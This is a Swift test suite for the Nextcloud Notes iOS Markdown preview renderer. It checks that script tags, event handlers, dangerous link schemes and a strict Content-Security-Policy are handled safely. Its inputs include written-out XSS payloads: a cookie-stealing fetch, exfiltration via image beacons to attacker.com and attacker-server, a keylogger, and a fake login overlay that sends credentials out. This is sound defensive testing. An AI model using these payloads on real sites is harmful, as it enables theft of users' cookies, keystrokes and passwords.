// SPDX-FileCopyrightText: Nextcloud GmbH
// SPDX-FileCopyrightText: 2026 Milen Pivchev
// SPDX-License-Identifier: GPL-3.0-or-later

import Testing
import Foundation
@testable import iOCNotes

/// Tests XSS and raw HTML injections when Markdown is converted into HTML for preview rendering.
@Suite("Preview Security Tests")
struct PreviewSecurityTests {
    private enum PreviewSecurityTestError: Error {
        case missingPreviewBundle
        case missingPreviewTemplate
    }

// MARK: HTML rendering

    private func renderedHTML(from markdown: String) -> String {
        MarkdownRenderer.html(from: markdown)
    }

    private func previewTemplateHTML() throws -> String {
        guard let previewBundleURL = Bundle.main.url(forResource: "Preview", withExtension: "bundle") else {
            throw PreviewSecurityTestError.missingPreviewBundle
        }

        guard let previewBundle = Bundle(url: previewBundleURL),
              let templateURL = previewBundle.url(forResource: "index", withExtension: "html")
        else {
            throw PreviewSecurityTestError.missingPreviewTemplate
        }

        return try String(contentsOf: templateURL, encoding: .utf8)
    }

    @Test(
        "Markdown renderer produces HTML from markdown",
        arguments: [
            ("# Title", "<h1>title</h1>"),
            ("- [x] done", "checkbox"),
            ("| a | b |\n| --- | --- |\n| 1 | 2 |", "<table>")
        ]
    )
    func markdownRendererProducesHTML(markdown: String, expectedFragment: String) {
        let html = renderedHTML(from: markdown).lowercased()
        #expect(
            html.contains(expectedFragment),
            "Rendered HTML should contain expected fragment '\(expectedFragment)'"
        )
    }

// MARK: XSS and HTML injection

    @Test(
        "Markdown renderer strips unsafe HTML and URLs",
        arguments: [
            ("<script>window.__xss = true;</script>", "<script"),
            ("<img src='x' onerror='window.__xss = true;'>", "onerror="),
            ("[click](javascript:window.__xss=true)", "javascript:"),
            ("![x](data:text/html;base64,xxx)", "data:text/html")
        ]
    )
    func markdownRendererStripsUnsafeHTMLAndURLs(markdown: String, forbiddenFragment: String) {
        let html = renderedHTML(from: markdown).lowercased()
        #expect(
            !html.contains(forbiddenFragment),
            "Rendered HTML should not contain '\(forbiddenFragment)'"
        )
    }

    @Test(
        "Markdown renderer strips dangerous link schemes",
        arguments: [
            "[x](javascript:alert(1))",
            "[x](vbscript:msgbox(1))",
            "[x](data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==)",
            "[x](file:///etc/passwd)",
            "[x](JaVaScRiPt:alert(1))",
            "[x](   javascript:alert(1))"
        ]
    )
    func markdownRendererStripsDangerousLinkSchemes(markdown: String) {
        let html = renderedHTML(from: markdown).lowercased()
        #expect(!html.contains("javascript:"), "Sanitizer must strip javascript links")
        #expect(!html.contains("vbscript:"), "Sanitizer must strip vbscript links")
        #expect(!html.contains("data:"), "Sanitizer must strip data links")
        #expect(!html.contains("file:"), "Sanitizer must strip file links")
    }

    @Test(
        "Markdown renderer strips script payload from mixed HTML input",
        arguments: [
            "<script>fetch('http://example.com?c='+document.cookie)</script><b>title</b>",
            "<img src=x onerror=alert(1)>content",
            "<svg><script>alert(1)</script></svg>"
        ]
    )
    func markdownRendererStripsScriptPayloadFromMixedHTMLInput(markdown: String) {
        let html = renderedHTML(from: markdown).lowercased()
        #expect(!html.contains("<script"), "Rendered output must not include script tags")
        #expect(!html.contains("document.cookie"), "Rendered output must not include cookie exfiltration code")
        #expect(!html.contains("onerror="), "Rendered output must not include inline event handlers")
    }

    @Test("Markdown renderer keeps safe web links")
    func markdownRendererKeepsSafeWebLinks() {
        let html = renderedHTML(from: "[nextcloud](https://nextcloud.com)").lowercased()
        #expect(html.contains("href=\"https://nextcloud.com\""), "Safe https links should be preserved")
    }

    @Test("Preview template defines strict CSP directives")
    func previewTemplateDefinesStrictCSPDirectives() throws {
        let html = try previewTemplateHTML().lowercased()

        #expect(
            html.contains("http-equiv=\"content-security-policy\""),
            "Preview template should define a Content-Security-Policy meta tag"
        )
        #expect(
            html.contains("script-src 'none'"),
            "Preview CSP should disable all script execution"
        )
        #expect(html.contains("object-src 'none'"), "Preview CSP should disable object embeddings")
        #expect(html.contains("base-uri 'none'"), "Preview CSP should disable base URI overrides")
        #expect(html.contains("frame-ancestors 'none'"), "Preview CSP should prevent framing")
        #expect(html.contains("form-action 'none'"), "Preview CSP should block form submissions")
    }

    @Test("Untrusted rendered HTML is constrained by template CSP")
    func untrustedRenderedHTMLIsConstrainedByTemplateCSP() throws {
        let rendered = renderedHTML(from: "<script>window.__xss = true;</script>").lowercased()
        let page = try previewTemplateHTML()
            .replacingOccurrences(of: "PREVIEW_HTML", with: rendered)
            .lowercased()

        #expect(!rendered.contains("<script"), "Renderer should strip script tags in safe mode")
        #expect(page.contains("script-src 'none'"), "Preview template must forbid script execution")
    }

    @Test("Exfiltration payload is neutralized")
    func exfiltrationPayloadIsNeutralized() {
        let markdown = """
        # Meeting Notes

        <script>
        var data = {
          url: window.location.href,
          userAgent: navigator.userAgent,
          platform: navigator.platform
        };
        new Image().src = 'https://attacker-server/exfil?d=' + btoa(JSON.stringify(data));
        </script>

        Normal content here.
        """

        let html = renderedHTML(from: markdown).lowercased()

        #expect(html.contains("<h1>meeting notes</h1>"))
        #expect(html.contains("normal content here"))
        #expect(!html.contains("<script"))
        #expect(!html.contains("window.location.href"))
        #expect(!html.contains("navigator.useragent"))
        #expect(!html.contains("attacker-server/exfil"))
    }

    @Test("Data exfiltration script payload is stripped from renderer output")
    func dataExfiltrationScriptPayloadIsStrippedFromRendererOutput() {
        let markdown = """
        <script>
        new Image().src = 'https://attacker.com/steal?d=' + btoa(JSON.stringify({
          url: location.href,
          userAgent: navigator.userAgent,
          screen: screen.width + 'x' + screen.height
        }));
        </script>
        """

        let html = renderedHTML(from: markdown).lowercased()

        #expect(!html.contains("<script"))
        #expect(!html.contains("new image().src"))
        #expect(!html.contains("attacker.com/steal"))
        #expect(!html.contains("navigator.useragent"))
    }

    @Test("Keylogger payload keeps input markup but strips active script")
    func keyloggerPayloadKeepsInputMarkupButStripsActiveScript() {
        let markdown = """
        <input type="text" id="i" placeholder="Search..." style="width:100%;padding:15px;">
        <script>
        document.getElementById('i').onkeyup = function(e) {
          new Image().src = 'https://attacker.com/k?key=' + e.key;
        };
        </script>
        """

        let html = renderedHTML(from: markdown).lowercased()

        #expect(!html.contains("<input"))
        #expect(!html.contains("<script"))
        #expect(!html.contains("onkeyup"))
        #expect(!html.contains("attacker.com/k?key"))
        #expect(!html.contains("document.getelementbyid"))
    }

    @Test("Phishing overlay payload is removed from renderer output")
    func phishingOverlayPayloadIsRemovedFromRendererOutput() {
        let markdown = """
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999;padding:40px;">
          <h2>Session Expired</h2>
          <p>Please re-enter your credentials:</p>
          <input type="text" id="u" placeholder="Username" style="width:100%;padding:12px;margin:5px 0;">
          <input type="password" id="p" placeholder="Password" style="width:100%;padding:12px;margin:5px 0;">
          <button onclick="new Image().src='https://attacker.com/creds?u='+document.getElementById('u').value+'&p='+document.getElementById('p').value" style="width:100%;padding:12px;background:#0082c9;color:#fff;border:none;">Login</button>
        </div>
        """

        let html = renderedHTML(from: markdown).lowercased()

        #expect(!html.contains("<div"))
        #expect(!html.contains("<input"))
        #expect(!html.contains("<button"))
        #expect(!html.contains("session expired"))
        #expect(!html.contains("attacker.com/creds"))
        #expect(!html.contains("onclick="))
    }
}
